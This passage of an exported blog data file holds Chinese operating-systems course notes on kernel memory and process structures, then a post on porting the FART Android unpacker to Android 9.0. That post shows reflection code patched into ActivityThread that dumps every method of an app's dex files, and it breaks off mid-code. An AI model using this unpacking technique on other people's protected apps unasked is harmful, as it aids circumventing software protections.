class="comment">//和查找到的kmvarsdsc_t结构保持一致</span></span><br><span class="line">        newkmvd-&gt;kva_limits = delkmvd-&gt;kva_limits;</span><br><span class="line">        newkmvd-&gt;kva_maptype = delkmvd-&gt;kva_maptype;</span><br><span class="line">        newkmvd-&gt;kva_mcstruct = vma;</span><br><span class="line">        delkmvd-&gt;kva_end = start;</span><br><span class="line">        <span class="comment">//加入链表</span></span><br><span class="line">        <span class="built_in">list_add</span>(&amp;newkmvd-&gt;kva_list, &amp;delkmvd-&gt;kva_list);</span><br><span class="line">        vma-&gt;vs_kmvdscnr++;</span><br><span class="line">        <span class="comment">//是否为最后一个kmvarsdsc_t结构</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">list_is_last</span>(&amp;newkmvd-&gt;kva_list, &amp;vma-&gt;vs_list) == TRUE)</span><br><span class="line">        &#123;</span><br><span class="line">            vma-&gt;vs_endkmvdsc = newkmvd;</span><br><span class="line">            vma-&gt;vs_currkmvdsc = newkmvd;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            vma-&gt;vs_currkmvdsc = newkmvd;</span><br><span class="line">        &#125;</span><br><span class="line">        rets = TRUE;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    rets = FALSE;</span><br><span class="line">out:</span><br><span class="line">    <span class="built_in">knl_spinunlock</span>(&amp;vma-&gt;vs_lock);</span><br><span class="line">    <span class="keyword">return</span> rets;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="处理缺页异常"><a href="#处理缺页异常" class="headerlink" title="处理缺页异常"></a>处理缺页异常</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">hal_fault_allocator -&gt; krluserspace_accessfailed : 异常分发器函数根据缺页异常编号调用缺页异常接口。</span><br><span class="line">krluserspace_accessfailed -&gt; vma_map_fairvadrs : 缺页异常接口调用的接口处理缺页异常。</span><br><span class="line">vma_map_fairvadrs -&gt; vma_map_fairvadrs_core : 进行缺页异常的核心处理。</span><br><span class="line">vma_map_fairvadrs_core -&gt; vma_map_find_kmvarsdsc : 查找对应的 kmvarsdsc_t 结构。</span><br><span class="line">vma_map_fairvadrs_core -&gt; vma_map_retn_kvmemcbox : 获取 kmvarsdsc_t 结构下对应 kvmemcbox_t 结构。</span><br><span class="line">vma_map_retn_kvmemcbox -&gt; knl_get_kvmemcbox : 新建一个 kvmemcbox_t 结构。</span><br><span class="line">vma_map_fairvadrs_core -&gt; vma_map_phyadrs : 分配物理内存页面并建立 MMU 页表。</span><br><span class="line">vma_map_phyadrs -&gt; vma_map_msa_fault : 调用核心函数。</span><br><span class="line">vma_map_msa_fault -&gt; vma_new_usermsa : 分配一个物理内存页面，挂载到 kvmemcbox_t 中，并返回对应的 msadsc_t 结构。</span><br><span class="line">vma_map_msa_fault -&gt; msadsc_ret_addr : 获取 msadsc_t 对应的内存页面的物理地址。</span><br><span class="line">vma_map_msa_fault -&gt; hal_mmu_transform : 建立 MMU 页表完成虚拟地址到物理地址的映射。</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>操作系统实战</category>
      </categories>
      <tags>
        <tag>操作系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实战10-进程</title>
    <url>/2021/11/23/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9810-%E8%BF%9B%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 进程结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_THREAD</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">spinlock_t</span>  td_lock;                    <span class="comment">// 进程的自旋锁         </span></span><br><span class="line">    <span class="type">list_h_t</span>    td_list;                    <span class="comment">// 进程链表 </span></span><br><span class="line">    <span class="type">uint_t</span>      td_flgs;                    <span class="comment">// 进程的标志</span></span><br><span class="line">    <span class="type">uint_t</span>      td_stus;                    <span class="comment">// 进程的状态</span></span><br><span class="line">    <span class="type">uint_t</span>      td_cpuid;                   <span class="comment">// 进程所在的 CPU 的 id</span></span><br><span class="line">    <span class="type">uint_t</span>      td_id;                      <span class="comment">// 进程的 id</span></span><br><span class="line">    <span class="type">uint_t</span>      td_tick;                    <span class="comment">// 进程运行了多少 tick</span></span><br><span class="line">    <span class="type">uint_t</span>      td_sumtick;                 </span><br><span class="line">    <span class="type">uint_t</span>      td_privilege;               <span class="comment">// 进程的权限</span></span><br><span class="line">    <span class="type">uint_t</span>      td_priority;                <span class="comment">// 进程的优先级</span></span><br><span class="line">    <span class="type">uint_t</span>      td_runmode;                 <span class="comment">// 进程的运行模式</span></span><br><span class="line">    <span class="type">adr_t</span>       td_krlstktop;               <span class="comment">// 应用程序内核栈顶地址</span></span><br><span class="line">    <span class="type">adr_t</span>       td_krlstkstart;             <span class="comment">// 应用程序内核栈开始地址</span></span><br><span class="line">    <span class="type">adr_t</span>       td_usrstktop;               <span class="comment">// 应用程序栈顶地址</span></span><br><span class="line">    <span class="type">adr_t</span>       td_usrstkstart;             <span class="comment">// 应用程序栈开始地址</span></span><br><span class="line">    <span class="type">mmadrsdsc_t</span>* td_mmdsc;                  <span class="comment">// 地址空间结构</span></span><br><span class="line">    <span class="type">void</span>*       td_resdsc;</span><br><span class="line">    <span class="type">void</span>*       td_privtep;</span><br><span class="line">    <span class="type">void</span>*       td_extdatap;</span><br><span class="line">    <span class="type">char_t</span>*     td_appfilenm;</span><br><span class="line">    <span class="type">uint_t</span>      td_appfilenmlen;            <span class="comment">//</span></span><br><span class="line">    <span class="type">context_t</span>   td_context;                 <span class="comment">// 机器上下文件结构</span></span><br><span class="line">    <span class="type">objnode_t</span>*  td_handtbl[TD_HAND_MAX];    <span class="comment">// 打开的对象数组，可以理解为进程打开资源的描述符数组</span></span><br><span class="line">    <span class="type">char_t</span>      td_name[THREAD_NAME_MAX];   <span class="comment">//</span></span><br><span class="line">&#125;<span class="type">thread_t</span>;</span><br></pre></td></tr></table></figure>

<p>进程的地址空间</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 进程的内存地址空间，它包含 virmemadrs_t 结构和 mmudsc_t 结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_MMADRSDSC</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">spinlock_t</span> msd_lock;		<span class="comment">// 保护自身的自旋锁</span></span><br><span class="line">	<span class="type">list_h_t</span> msd_list;			<span class="comment">// 链表</span></span><br><span class="line">	<span class="type">uint_t</span> msd_flag;			<span class="comment">// 状态和标志</span></span><br><span class="line">	<span class="type">uint_t</span> msd_stus;</span><br><span class="line">	<span class="type">uint_t</span> msd_scount;			<span class="comment">// 计数，该结构可能被共享</span></span><br><span class="line">	<span class="type">thread_t</span>* msd_thread;	</span><br><span class="line">	<span class="type">sem_t</span>  msd_sem;				<span class="comment">// 信号量</span></span><br><span class="line">	<span class="type">mmudsc_t</span> msd_mmu;			<span class="comment">// MMU相关的信息</span></span><br><span class="line">	<span class="type">virmemadrs_t</span> msd_virmemadrs;<span class="comment">// 虚拟地址空间</span></span><br><span class="line">	<span class="type">adr_t</span> msd_stext;			<span class="comment">// 应用的指令区的开始、结束地址</span></span><br><span class="line">	<span class="type">adr_t</span> msd_etext;</span><br><span class="line">	<span class="type">adr_t</span> msd_sdata;			<span class="comment">// 应用的数据区的开始、结束地址</span></span><br><span class="line">	<span class="type">adr_t</span> msd_edata;</span><br><span class="line">	<span class="type">adr_t</span> msd_sbss;				<span class="comment">// 应用初始化为 0 的区域开始、结束地址</span></span><br><span class="line">	<span class="type">adr_t</span> msd_ebss;</span><br><span class="line">	<span class="type">adr_t</span> msd_sbrk;				<span class="comment">// 应用的堆区的开始、结束地址</span></span><br><span class="line">	<span class="type">adr_t</span> msd_ebrk;</span><br><span class="line">&#125;<span class="type">mmadrsdsc_t</span>;</span><br></pre></td></tr></table></figure>

<p>进程的机器上下文</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 进程的机器上下文</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_CONTEXT</span></span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">uint_t</span>       ctx_nextrip;   <span class="comment">// 保存下一次运行的地址</span></span><br><span class="line">    <span class="type">uint_t</span>       ctx_nextrsp;   <span class="comment">// 保存下一次运行时内核栈的地址</span></span><br><span class="line">    <span class="type">x64tss_t</span>*    ctx_nexttss;   <span class="comment">// 指向 tss 结构</span></span><br><span class="line">&#125;<span class="type">context_t</span>;</span><br></pre></td></tr></table></figure>

<p>x64tss_t 结构</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_X64TSS</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">u32_t</span> reserv0;	<span class="comment">// 保留</span></span><br><span class="line">	<span class="type">u64_t</span> rsp0;		<span class="comment">// R0特权级的栈地址</span></span><br><span class="line">	<span class="type">u64_t</span> rsp1;		<span class="comment">// R1特权级的栈地址，我们未使用</span></span><br><span class="line">	<span class="type">u64_t</span> rsp2;		<span class="comment">// R2特权级的栈地址，我们未使用</span></span><br><span class="line">	<span class="type">u64_t</span> reserv28;	<span class="comment">// 保留</span></span><br><span class="line">	<span class="type">u64_t</span> ist[<span class="number">7</span>];	<span class="comment">// 我们未使用</span></span><br><span class="line">	<span class="type">u64_t</span> reserv92;	<span class="comment">// 保留</span></span><br><span class="line">	<span class="type">u16_t</span> reserv100;<span class="comment">// 保留</span></span><br><span class="line">	<span class="type">u16_t</span> iobase;	<span class="comment">// 我们未使用</span></span><br><span class="line">	</span><br><span class="line">&#125;__attribute__((packed)) <span class="type">x64tss_t</span>;</span><br></pre></td></tr></table></figure>

<h1 id="建立进程"><a href="#建立进程" class="headerlink" title="建立进程"></a>建立进程</h1><p>时序图</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">krlnew_thread -&gt; krlnew_kern_thread_core : 建立内核进程。</span><br><span class="line">krlnew_thread -&gt; krlnew_user_thread_core : 建立普通进程。</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>
<p>内核进程就是用进程的方式去运行一段内核代码，那么这段代码就可以随时暂停或者继续运行，又或者和其它代码段并发运行，只是这种进程永远不会回到进程应用程序地址空间中去，只会在内核地址空间中运行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">krlnew_user_thread_core -&gt; krlnew : 分配内核栈空间。</span><br><span class="line">krlnew_user_thread_core -&gt; krlnew_thread_dsc : 建立 thread_t 结构体的实例变量。</span><br><span class="line">krlnew_user_thread_core -&gt; thread_name : 设置进程名称。</span><br><span class="line">krlnew_user_thread_core -&gt; krlthread_kernstack_init : 初始化进程的内核栈。</span><br><span class="line">krlnew_user_thread_core -&gt; krlschdclass_add_thread : 加入进程调度系统。</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>

<p>创建 thread_t 结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">krlnew_thread_dsc -&gt; krlnew : 分配 thread_t 结构大小的内存空间。</span><br><span class="line">krlnew_thread_dsc -&gt; thread_t_init : 初始化刚刚分配的 thread_t 结构。</span><br><span class="line">thread_t_init -&gt; context_t_init : 设置进程名称。</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>

<p>初始化内核栈</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">krlthread_kernstack_init -&gt; krlnew : 分配 thread_t 结构大小的内存空间。</span><br><span class="line">krlnew_thread_dsc -&gt; thread_t_init : 初始化刚刚分配的 thread_t 结构。</span><br><span class="line">thread_t_init -&gt; context_t_init : 设置进程名称。</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>


<p>建立普通进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">krlnew_user_thread_core -&gt; krlnew : 分配应用程序栈空间。</span><br><span class="line">krlnew_user_thread_core -&gt; krlnew : 分配内核栈空间</span><br><span class="line">krlnew_user_thread_core -&gt; krlnew_thread_dsc : 建立 thread_t 结构体的实例变量</span><br><span class="line">krlnew_user_thread_core -&gt; krlthread_userstack_init : 初始化返回进程应用程序空间的内核栈</span><br><span class="line">krlnew_user_thread_core -&gt; krlschdclass_add_thread : 加入调度器系统</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>

<h1 id="多进程调度"><a href="#多进程调度" class="headerlink" title="多进程调度"></a>多进程调度</h1><p>进程调度数据结构</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_THRDLST</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">list_h_t</span>    tdl_lsth;       <span class="comment">// 挂载进程的链表头</span></span><br><span class="line">    <span class="type">thread_t</span>*   tdl_curruntd;   <span class="comment">// 该链表上正在运行的进程</span></span><br><span class="line">    <span class="type">uint_t</span>      tdl_nr;         <span class="comment">// 该链表上进程个数</span></span><br><span class="line">&#125;<span class="type">thrdlst_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_SCHDATA</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">spinlock_t</span>  sda_lock;               <span class="comment">// 自旋锁</span></span><br><span class="line">    <span class="type">uint_t</span>      sda_cpuid;              <span class="comment">// 当前CPU id</span></span><br><span class="line">    <span class="type">uint_t</span>      sda_schdflgs;           <span class="comment">// 标志</span></span><br><span class="line">    <span class="type">uint_t</span>      sda_premptidx;          <span class="comment">// 进程抢占计数</span></span><br><span class="line">    <span class="type">uint_t</span>      sda_threadnr;           <span class="comment">// 进程数</span></span><br><span class="line">    <span class="type">uint_t</span>      sda_prityidx;           <span class="comment">// 当前优先级</span></span><br><span class="line">    <span class="type">thread_t</span>*   sda_cpuidle;            <span class="comment">// 当前CPU的空转进程</span></span><br><span class="line">    <span class="type">thread_t</span>*   sda_currtd;             <span class="comment">// 当前正在运行的进程</span></span><br><span class="line">    <span class="type">thrdlst_t</span>   sda_thdlst[PRITY_MAX];  <span class="comment">// 进程链表数组</span></span><br><span class="line">    <span class="type">list_h_t</span>    sda_exitlist;  </span><br><span class="line">&#125;<span class="type">schdata_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_SCHEDCALSS</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">spinlock_t</span>  scls_lock;              <span class="comment">// 自旋锁</span></span><br><span class="line">    <span class="type">uint_t</span>      scls_cpunr;             <span class="comment">// CPU 个数</span></span><br><span class="line">    <span class="type">uint_t</span>      scls_threadnr;          <span class="comment">// 系统中所有的进程数</span></span><br><span class="line">    <span class="type">uint_t</span>      scls_threadid_inc;      <span class="comment">// 分配进程id所用</span></span><br><span class="line">    <span class="type">schdata_t</span>   scls_schda[CPUCORE_MAX];<span class="comment">// 每个 CPU 调度数据结构</span></span><br><span class="line">&#125;<span class="type">schedclass_t</span>;</span><br></pre></td></tr></table></figure>

<img src="/2021/11/23/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9810-%E8%BF%9B%E7%A8%8B/%E7%BB%84%E7%BB%87%E8%BF%9B%E7%A8%8B%E7%A4%BA%E6%84%8F%E5%9B%BE.png" class="">


<p>管理进程的初始化</p>
<p>设计实现进程调度器</p>
<h1 id="实现进程的等待与唤醒机制"><a href="#实现进程的等待与唤醒机制" class="headerlink" title="实现进程的等待与唤醒机制"></a>实现进程的等待与唤醒机制</h1>]]></content>
      <categories>
        <category>操作系统实战</category>
      </categories>
      <tags>
        <tag>操作系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实战11-设备IO</title>
    <url>/2021/11/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9811-%E8%AE%BE%E5%A4%87IO/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>操作系统实战</category>
      </categories>
      <tags>
        <tag>操作系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实战12-文件系统</title>
    <url>/2021/11/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9812-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>操作系统实战</category>
      </categories>
      <tags>
        <tag>操作系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title>移植FART到Adnroid 9.0</title>
    <url>/2020/07/17/%E7%A7%BB%E6%A4%8DFART%E5%88%B0Adnroid-9-0/</url>
    <content><![CDATA[<p>最近有点时间就尝试着移植 FART 到 Android 9.0 ，本文记录一下的整个过程。</p>
<h1 id="获取-cloassloader-执行主动调用"><a href="#获取-cloassloader-执行主动调用" class="headerlink" title="获取 cloassloader 执行主动调用"></a>获取 cloassloader 执行主动调用</h1><p>首先修改 <code>frameworks/base/core/java/android/app/ActivityThread.java</code> 文件，添加以下内容。其中主要思想就是获取 apk 的 classloader 然后通过反射获取 dumpMethodCode 方法，执行主动调用，下面添加 dumpMethodCode 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// add start</span><br><span class="line">import android.os.Build;</span><br><span class="line">import android.util.ArrayMap;</span><br><span class="line">import android.util.Log;</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileWriter;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.lang.ref.WeakReference;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Modifier;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import dalvik.system.BaseDexClassLoader;</span><br><span class="line">import dalvik.system.DexClassLoader;</span><br><span class="line">// add end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// add start</span><br><span class="line">    public static String CKCatTAG = &quot;CKCatUnPack&quot;;</span><br><span class="line">    public static Field getClassField(ClassLoader classloader, String className,</span><br><span class="line">        String fieldName)&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Class clazz = classloader.loadClass(className);</span><br><span class="line">            Field field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            return field;</span><br><span class="line"></span><br><span class="line">        &#125;catch(SecurityException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (IllegalArgumentException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object getClassFieldObject(ClassLoader classloader, String className, </span><br><span class="line">        Object obj, String fieldName)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz = classloader.loadClass(className);</span><br><span class="line">            Field field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            Object result = null;</span><br><span class="line">            result = field.get(obj);</span><br><span class="line">            return result;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object invokeStaticMethod(String className, String methodName,</span><br><span class="line">        Class[] pareType, Object[] pareValues)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz = Class.forName(className);</span><br><span class="line">            Method method = clazz.getMethod(methodName, pareType);</span><br><span class="line">            return method.invoke(null, pareValues);</span><br><span class="line">        &#125; catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; </span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object getFieldObject(String className, Object obj,</span><br><span class="line">        String fieldName)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz = Class.forName(className);</span><br><span class="line">            Field field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            return field.get(obj);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static ClassLoader getClassLoader()&#123;</span><br><span class="line">        ClassLoader classloader = null;</span><br><span class="line">        Object currentActivityThread = invokeStaticMethod(&quot;android.app.ActivityThread&quot;,</span><br><span class="line">            &quot;currentActivityThread&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);</span><br><span class="line">        Object mBoundApplication = getFieldObject(&quot;android.app.ActivityThread&quot;, </span><br><span class="line">            currentActivityThread, &quot;mBoundApplication&quot;);</span><br><span class="line">        Object loadedApkInfo = getFieldObject(&quot;android.app.ActivityThread$AppBindData&quot;,</span><br><span class="line">            mBoundApplication, &quot;info&quot;);</span><br><span class="line">        Application mApplication = (Application)getFieldObject(&quot;android.app.loadedApk&quot;,</span><br><span class="line">            loadedApkInfo, &quot;mApplication&quot;);</span><br><span class="line">        classloader = mApplication.getClassLoader();</span><br><span class="line">        return classloader;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void loadClassAndInvoke(ClassLoader appClassloader, String eachClassName, </span><br><span class="line">        Method dumpMethodCode_method)&#123;</span><br><span class="line">        Log.i(CKCatTAG, &quot;go into loadClassAndInvoke-&gt;&quot; + &quot;classname:&quot; + eachClassName);</span><br><span class="line"></span><br><span class="line">        Class retClass = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            retClass = appClassloader.loadClass(eachClassName);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            return;</span><br><span class="line">        &#125; catch (Error e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            return;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        if (retClass != null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Constructor&lt;?&gt; cons[] = retClass.getDeclaredConstructors();</span><br><span class="line">                for (Constructor&lt;?&gt; constructor : cons)&#123;</span><br><span class="line">                    if (dumpMethodCode_method != null) &#123;</span><br><span class="line">                        try &#123;</span><br><span class="line">                            dumpMethodCode_method.invoke(null, constructor);</span><br><span class="line">                        &#125; catch (Exception e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                            continue;</span><br><span class="line">                        &#125; catch (Error e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                            continue;</span><br><span class="line">                        &#125; </span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        Log.e(CKCatTAG, &quot;dumpMethodCode_method is null &quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;  catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; catch (Error e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; </span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                Method[] methods = retClass.getDeclaredMethods();</span><br><span class="line">                if (methods != null) &#123;</span><br><span class="line">                    for (Method m : methods) &#123;</span><br><span class="line">                        if (dumpMethodCode_method != null) &#123;</span><br><span class="line">                            try &#123;</span><br><span class="line">                               dumpMethodCode_method.invoke(null, m);</span><br><span class="line">                             &#125; catch (Exception e) &#123;</span><br><span class="line">                                e.printStackTrace();</span><br><span class="line">                                continue;</span><br><span class="line">                            &#125; catch (Error e) &#123;</span><br><span class="line">                                e.printStackTrace();</span><br><span class="line">                                continue;</span><br><span class="line">                            &#125; </span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            Log.e(CKCatTAG, &quot;dumpMethodCode_method is null &quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; catch (Error e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void fart()&#123;</span><br><span class="line">        //获取当前 classloader</span><br><span class="line">        ClassLoader appClassloader = getClassLoader();</span><br><span class="line">        List&lt;Object&gt; dexFieldsArray = new ArrayList&lt;Object&gt;();</span><br><span class="line"></span><br><span class="line">        // 获取 pathList 字段</span><br><span class="line">        Field pathList_Field = (Field)getClassField(appClassloader, </span><br><span class="line">            &quot;dalvik.system.BaseDexClassLoader&quot;, &quot;pathList&quot;);</span><br><span class="line">        Object pathList_object = getFieldObject(&quot;dalvik.system.BaseDexClassLoader&quot;, </span><br><span class="line">            appClassloader, &quot;pathList&quot;);</span><br><span class="line"></span><br><span class="line">        // 获取 dexElements</span><br><span class="line">        Object[] dexElements = (Object[]) getFieldObject(&quot;dalvik.system.DexPathList&quot;, </span><br><span class="line">            pathList_object, &quot;dexElements&quot;);</span><br><span class="line"></span><br><span class="line">        Field dexFile_Field = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            dexFile_Field = (Field)getClassField(appClassloader, </span><br><span class="line">                &quot;dalvik.system.DexPathList$Element&quot;, &quot;dexFile&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class dexFileClazz = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            dexFileClazz = appClassloader.loadClass(&quot;dalvik.system.DexFile&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Method getClassNameList_Method = null;</span><br><span class="line">        Method defineClass_Method = null;</span><br><span class="line">        Method dumpMethodCode_Method = null;</span><br><span class="line">        // 通过反射获取获取 dumpMethodCode </span><br><span class="line">        for (Method method : dexFileClazz.getDeclaredMethods())&#123;</span><br><span class="line">            if (method.getName().equals(&quot;getClassNameList&quot;)) &#123;</span><br><span class="line">                getClassNameList_Method = method;</span><br><span class="line">                getClassNameList_Method.setAccessible(true);</span><br><span class="line">            &#125;</span><br><span class="line">            if (method.getName().equals(&quot;defineClassNative&quot;)) &#123;</span><br><span class="line">                defineClass_Method = method;</span><br><span class="line">                defineClass_Method.setAccessible(true);</span><br><span class="line">            &#125;</span><br><span class="line">            if (method.getName().equals(&quot;dumpMethodCode&quot;)) &#123;</span><br><span class="line">                dumpMethodCode_Method = method;</span><br><span class="line">                dumpMethodCode_Method.setAccessible(true);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 获取 mCookie</span><br><span class="line">        Field mCookieField = getClassField(appClassloader, &quot;dalvik.system.DexFile&quot;, &quot;mCookie&quot;);</span><br><span class="line">        for (int i = 0; i &lt; dexElements.length; i++) &#123;</span><br><span class="line">            Object element = dexElements[i];</span><br><span class="line">            Object dexfile = null;</span><br><span class="line">            try &#123;</span><br><span class="line">                dexfile = (Object)dexFile_Field.get(element);</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (dexfile == null) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if(dexfile != null)&#123;</span><br><span class="line">                dexFieldsArray.add(dexfile);</span><br><span class="line">                Object mCookie = getClassFieldObject(appClassloader, </span><br><span class="line">                    &quot;dalvik.system.DexFile&quot;, dexfile, &quot;mCookie&quot;);</span><br><span class="line">                if (mCookie == null) &#123;</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String[] classNames = null;</span><br><span class="line">                try &#123;</span><br><span class="line">                    classNames = (String[])getClassNameList_Method.invoke(dexfile, mCookie);</span><br><span class="line">                &#125; catch (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    continue;</span><br><span class="line">                &#125; catch (Error e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (classNames != null) &#123;</span><br><span class="line">                    for(String eachClassName: classNames)&#123;</span><br><span class="line">                        // 执行主动调用</span><br><span class="line">                        loadClassAndInvoke(appClassloader, eachClassName, dumpMethodCode_Method);</span><br><span class="line">                    